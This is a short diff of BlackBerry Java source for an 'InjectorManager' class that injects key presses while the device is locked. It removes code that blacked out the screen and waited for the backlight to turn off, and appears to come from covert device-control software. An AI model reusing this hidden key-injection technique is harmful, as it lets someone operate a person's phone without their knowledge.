@@ -23,7 +23,6 @@ import net.rim.device.api.ui.Screen;
 import net.rim.device.api.ui.UiApplication;
 import blackberry.AppListener;
 import blackberry.Device;
-import blackberry.Main;
 import blackberry.Singleton;
 import blackberry.Status;
 import blackberry.debug.Check;
@@ -293,22 +292,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
             return;
         }
 
-        UiApplication.getUiApplication().invokeLater(new Runnable() {
-            public void run() {
-                Main.getInstance().pushBlack();
-            }
-        });
-
         try {
-            for (int i = 0; i < 10; i++) {
-                //#ifdef DEBUG
-                debug.trace("unLock, waiting... ");
-                //#endif
-                Utils.sleep(1000);
-                if (status.backlightEnabled()) {
-                    return;
-                }
-            }
 
             KeyInjector.pressRawKeyCode(Keypad.KEY_ESCAPE);
             Utils.sleep(300);
@@ -338,7 +322,7 @@ public class InjectorManager implements ApplicationObserver, iSingleton,
 
             }
         } finally {
-            Main.getInstance().popBlack();
+            //Main.getInstance().popBlack();
         }
     }
 
